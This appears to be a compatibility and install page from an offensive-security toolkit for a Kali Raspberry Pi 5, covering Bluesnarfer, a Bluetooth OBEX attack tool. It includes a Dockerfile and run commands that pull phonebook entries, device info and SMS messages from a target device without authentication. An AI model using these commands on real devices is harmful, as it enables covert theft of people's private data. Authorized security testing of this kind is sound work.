## Deployment Classification

> **RUNS ON ARGOS RPi 5: YES** — Simple C utility; compiles natively with GCC on ARM64

| Method               | Supported | Notes                                                          |
| -------------------- | --------- | -------------------------------------------------------------- |
| **Docker Container** | YES       | Privileged mode + `--net=host` for BlueZ HCI access            |
| **Native Install**   | YES       | Preferred method; `make` with `libbluetooth-dev` on Kali ARM64 |

## Tool Description

Bluesnarfer exploits the OBEX (Object Exchange) protocol vulnerability in Bluetooth-enabled devices to gain unauthorized access to stored data including phonebooks, calendars, SMS messages, and files without user authentication or notification. The tool operates by crafting malicious OBEX requests through the Bluetooth RFCOMM layer, targeting devices with improperly secured OBEX profiles. It is a lightweight C utility that directly interfaces with the Linux BlueZ Bluetooth stack.

## Docker Compatibility Analysis

### Can it run in Docker?

**YES** - Bluesnarfer runs in Docker with Bluetooth adapter passthrough. It is a small C binary that links against libbluetooth (BlueZ) and has minimal dependencies.

### Host OS-Level Requirements

- `--privileged` - Required for raw Bluetooth HCI socket access
- `--net=host` - Required for BlueZ/HCI socket communication with host Bluetooth stack
- `--device=/dev/bus/usb` - USB passthrough if using an external Bluetooth adapter
- Host kernel modules: `bluetooth`, `btusb`, `rfcomm`, `bnep`
- Host BlueZ stack must be running (`bluetoothd`)

### Docker-to-Host Communication

- Host must have BlueZ installed and Bluetooth service running
- Bluetooth adapter must be up on the host (`hciconfig hci0 up`)
- D-Bus socket sharing may be needed: `-v /var/run/dbus:/var/run/dbus`
- Output data via volume mount or stdout capture

## Install Instructions (Docker on Kali RPi 5)

### Dockerfile

```dockerfile
FROM kalilinux/kali-rolling:latest

RUN apt-get update && apt-get install -y \
    build-essential \
    libbluetooth-dev \
    bluetooth \
    bluez \
    git \
    && rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/kimbo/bluesnarfer.git /opt/bluesnarfer

WORKDIR /opt/bluesnarfer

RUN make

ENTRYPOINT ["./bluesnarfer"]
CMD ["--help"]
```

### Build and Run

```bash
# Build the image
docker build -t argos/bluesnarfer .

# Ensure Bluetooth adapter is up on host
sudo hciconfig hci0 up

# Run - read phonebook from target device
docker run --rm -it \
  --privileged \
  --net=host \
  -v /var/run/dbus:/var/run/dbus \
  argos/bluesnarfer -r 1-100 -b AA:BB:CC:DD:EE:FF

# Run - read device info
docker run --rm -it \
  --privileged \
  --net=host \
  -v /var/run/dbus:/var/run/dbus \
  argos/bluesnarfer -i -b AA:BB:CC:DD:EE:FF

# Run - read SMS messages
docker run --rm -it \
  --privileged \
  --net=host \
  -v /var/run/dbus:/var/run/dbus \
  argos/bluesnarfer -s SM -r 1-50 -b AA:BB:CC:DD:EE:FF
```

## Kali Linux Raspberry Pi 5 Compatibility

### Architecture Support

**ARM64 NATIVE** - Bluesnarfer is a straightforward C application that compiles with standard GCC on any architecture. It links against libbluetooth-dev which is available in Kali ARM64 repositories. No architecture-specific assembly or platform dependencies.

### Hardware Constraints

- CPU: Extremely lightweight single-threaded C utility; negligible CPU usage on Cortex-A76
- RAM: Minimal memory footprint (~10-20MB); trivial for 8GB system
- Hardware: Requires any Bluetooth adapter supporting RFCOMM connections. The RPi 5 onboard Bluetooth adapter works. An external Class 1 USB Bluetooth adapter extends effective range

### Verdict

**COMPATIBLE** - Bluesnarfer compiles and runs natively on Kali ARM64 without any modifications. It is one of the simplest Bluetooth tools to deploy. Docker adds unnecessary overhead for this lightweight utility; native compilation recommended for production use.
